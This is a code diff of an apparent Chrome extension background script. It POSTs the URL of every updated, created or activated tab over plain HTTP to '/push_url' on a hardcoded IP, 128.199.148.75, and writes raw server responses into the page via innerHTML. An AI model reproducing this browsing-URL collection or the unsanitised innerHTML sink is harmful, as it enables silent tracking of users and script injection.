@@ -1,3 +1,26 @@
+var xhr = new XMLHttpRequest();
+//xhr.open("GET", "https://api.example.com/data.json", true);
+xhr.open("GET", "http://128.199.148.75:8000/status", true);
+xhr.onreadystatechange = function () {
+  if (xhr.readyState == 4) {
+    // WARNING! Might be evaluating an evil script!
+    // var resp = eval("(" + xhr.responseText + ")");
+    document.getElementById("statusflag").innerHTML = xhr.responseText;
+  }
+}
+xhr.send();
+
+var xhr1 = new XMLHttpRequest();
+xhr1.open("GET", "http://128.199.148.75:8000/sessionNumber", true);
+xhr1.onreadystatechange = function () {
+  if (xhr1.readyState == 4) {
+    // WARNING! Might be evaluating an evil script!
+    // var resp = eval("(" + xhr.responseText + ")");
+    document.getElementById("sessionNumber").innerHTML = xhr1.responseText;
+  }
+}
+xhr1.send();
+
 var previous = ''
 var prev_tab_id = -100
 var buff = new Date().getTime() / 1000;
@@ -9,7 +32,7 @@ chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
     if (Math.abs(res-buff) > 5)
     {
       var http = new XMLHttpRequest();
-      http.open("POST", "http://128.199.194.208:8000/push_url", true);
+      http.open("POST", "http://128.199.148.75:8000/push_url", true);
       http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
       var params = tab.url;
       http.send("i_url="+params);
@@ -28,7 +51,7 @@ chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
       if (Math.abs(res-buff) > 5)
       {
         var http = new XMLHttpRequest();
-        http.open("POST", "http://128.199.194.208:8000/push_url", true);
+        http.open("POST", "http://128.199.148.75:8000/push_url", true);
         http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         var params = tab.url;
         http.send("i_url="+params);
@@ -49,7 +72,7 @@ chrome.tabs.onCreated.addListener(function(tab) {
      if (Math.abs(res-buff) > 5)
      {
        var http = new XMLHttpRequest();
-       http.open("POST", "http://128.199.194.208:8000/push_url", true);
+       http.open("POST", "http://128.199.148.75:8000/push_url", true);
        http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        var params = tab.url;
        http.send("i_url="+params);
@@ -72,7 +95,7 @@ chrome.tabs.onActivated.addListener(function(tab_info) {
           if (Math.abs(res-buff) > 5)
           {
             var http = new XMLHttpRequest();
-            http.open("POST", "http://128.199.194.208:8000/push_url", true);
+            http.open("POST", "http://128.199.148.75:8000/push_url", true);
             http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
             var params = tab.url;
             http.send("i_url="+params);
